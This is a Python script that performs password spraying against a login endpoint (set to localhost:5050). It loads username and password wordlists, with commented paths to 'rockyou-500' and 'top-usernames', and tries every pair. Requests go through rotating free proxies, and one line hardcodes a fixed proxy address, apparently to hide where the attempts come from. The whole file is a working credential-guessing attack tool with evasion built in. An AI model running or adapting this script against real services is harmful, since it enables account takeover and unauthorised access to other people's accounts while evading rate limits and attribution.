import os
import requests
from concurrent.futures import ThreadPoolExecutor
import random
import time
import threading
import rotating_free_proxies

# Lock for synchronized output
print_lock = threading.Lock()

# Set the correct target URL for the login endpoint on your backend
url = "http://localhost:5050/login"

# Define headers (optional)
headers = {
    'User-Agent': 'Mozilla/5.0',
    'Content-Type': 'application/json'  # Ensure correct content type
}

# Function to read the usernames from a file
def read_usernames(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file.readlines()]

# Function to read the passwords from a file
def read_passwords(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file.readlines()]
    
def read_proxies(file_path):
    proxies_list = []
    
    # Open the file and read the proxies
    with open(file_path, 'r') as file:
        for line in file:
            # Split each line by space to get IP:Port and Protocol
            ip_port, protocol = line.strip().split()
            
            # Add to the proxies list based on protocol
            if protocol == "HTTP":
                proxies_list.append({"http": f"http://{ip_port}"
                                    #  , "https": f"http://{ip_port}"
                                    }
                                     )
    return proxies_list

base_dir = os.path.dirname(os.path.abspath(__file__))

proxy_file_path = os.path.join(base_dir, 'data', 'Proxy', 'proxies.txt')
proxies_list = read_proxies(proxy_file_path)


# Function to get a random proxy
def get_random_proxy():
    return random.choice(proxies_list)

# Function to perform a single login attempt
def attempt_login(username, password, max_retries=3):
    data = {
        'username': username,
        'password': password
    }

    retries = 0
    while retries < max_retries:
        # Get a random proxy for each attempt
        proxy = get_random_proxy()

        proxy = {
            "http": "http://176.99.2.43:1081",
            "https": "http://176.99.2.43:1081",
        }
        
        try:
            # Adding a timeout of 10 seconds for the request
            response = requests.post(url, json=data, proxies=proxy, timeout=10)

            # Lock the print statements to avoid race conditions
            with print_lock:
                print(f"Attempt for {username}:{password} with Proxy {proxy} returned {response.status_code}")

            # Check the HTTP status code for valid login response
            if response.status_code == 200:
                with print_lock:
                    print(f"[+] Successful login with {username}:{password} (Status Code: {response.status_code}) using proxy {proxy}")
                return True
            elif response.status_code == 302:  # Redirect (could indicate success in some systems)
                with print_lock:
                    print(f"[+] Successful login with {username}:{password} (Redirect to: {response.headers.get('Location', 'unknown')}) using proxy {proxy}")
                return True
            elif response.status_code == 401:
                with print_lock:
                    print(f"[-] Failed login for {username} (Status Code: 401 Unauthorized) using proxy {proxy}")
                return False  # No retry, incorrect username/password
            elif response.status_code == 403:
                with print_lock:
                    print(f"[-] Failed login for {username} (Status Code: 403 Forbidden) using proxy {proxy}")
                return False  # No retry, incorrect username/password
            else:
                with print_lock:
                    print(f"[-] Failed login for {username} (Status Code: {response.status_code}) using proxy {proxy}")
                return False  # No retry, username/password issue or other error

        except requests.exceptions.ProxyError:
            with print_lock:
                print(f"[-] Proxy error occurred for {username} using proxy {proxy}, retrying...")
        except requests.exceptions.Timeout:
            with print_lock:
                print(f"[-] Timeout error for {username} using proxy {proxy}, retrying...")
        except requests.exceptions.RequestException as e:
            with print_lock:
                print(f"[-] General error for {username} using proxy {proxy}: {e}, retrying...")

        # Retry by increasing the retry count
        retries += 1
        time.sleep(2)  # Optional: Add delay before retrying

    # If we exceed retries, print error message
    with print_lock:
        print(f"[!] Max retries reached for {username}:{password}. Skipping.")
    return False

# Function to perform password spraying
def password_spray(usernames, passwords):
    # Using ThreadPoolExecutor to manage a pool of threads
    # with ThreadPoolExecutor(max_workers=10) as executor:
    #     # Iterate through each username and try each password
    #     for username in usernames:
    #         for password in passwords:
    #             executor.submit(attempt_login, username, password)
    for username in usernames:
        for password in passwords:
            attempt_login(username, password, 3)

# Run the password spray
if __name__ == "__main__":
    # Get the directory of the current script
    base_dir = os.path.dirname(os.path.abspath(__file__))

    # Build paths relative to the script's directory
    # username_file_path = os.path.join(base_dir, 'data', 'TestInput', 'top-usernames.txt')
    # password_file_path = os.path.join(base_dir, 'data', 'TestInput', 'rockyou-500.txt')

    username_file_path = os.path.join(base_dir, 'data', 'TestInputSmall', 'username.txt')
    password_file_path = os.path.join(base_dir, 'data', 'TestInputSmall', 'password.txt')
    

    # Read the usernames and passwords from files
    usernames = read_usernames(username_file_path)
    passwords = read_passwords(password_file_path)

    # Run the password spray
    password_spray(usernames, passwords)
